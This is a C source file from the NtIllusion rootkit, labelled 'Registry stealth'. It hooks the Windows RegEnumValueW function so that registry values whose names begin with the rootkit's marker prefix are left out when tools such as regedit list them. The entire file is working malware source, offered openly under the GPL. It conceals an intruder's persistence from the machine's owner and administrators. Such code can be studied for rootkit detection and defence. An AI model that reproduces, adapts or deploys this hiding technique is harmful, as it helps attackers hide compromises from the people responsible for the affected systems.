/******************************************************************************
  kNTIReg.c		: Registry stealth
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/
#include <windows.h>
#include "kNTIReg.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

FARPROC fRegEnumValueW=0;
extern FARPROC fGetProcAddress;

//	o Regedit hijack o
//		MyRegEnumValue : hide registry keys when a list is requested
LONG WINAPI MyRegEnumValue(HKEY hKey,DWORD dwIndex,LPWSTR lpValueName,LPDWORD lpcValueName,LPDWORD lpReserved,  
  LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	//HINSTANCE hLib;
	LONG lRet; // return value
	char buf[256];

	if(!fRegEnumValueW)
	{
		fRegEnumValueW = (FARPROC) fGetProcAddress(GetModuleHandle("advapi32.dll"), "RegEnumValueW");
		if(!fRegEnumValueW)
			return 0;
	}
/*	// dynamic linking with advapi32 in order not to use extra static dll 
	// linkage (code size optimization)
	hLib = LoadLibrary("advapi32.dll");
	if(!hLib)
		return 0;
	fRegEnumValueW = (FARPROC) GetProcAddress(hLib, "RegEnumValueW");
	if(!fRegEnumValueW)
		return 0;
*/
	// Real stuff is here :
	lRet = fRegEnumValueW(hKey,dwIndex,lpValueName,lpcValueName,lpReserved,
			lpType, lpData,lpcbData);
	 // Convert string from unicode
	WideCharToMultiByte(CP_ACP, 0,lpValueName, -1, buf, 255,NULL, NULL);
	if(!_strnicmp((char*)buf, RTK_REG_CHAR, strlen(RTK_REG_CHAR))) {
		if(VERBOSE_STEALTH)
			OutputString(
			"[!] NTIllusion made the key '%s' (and all subsequent keys) hidden.\n",
			(char*)buf);
		lRet=1; // filter if our key is concerned
	}
return lRet;
}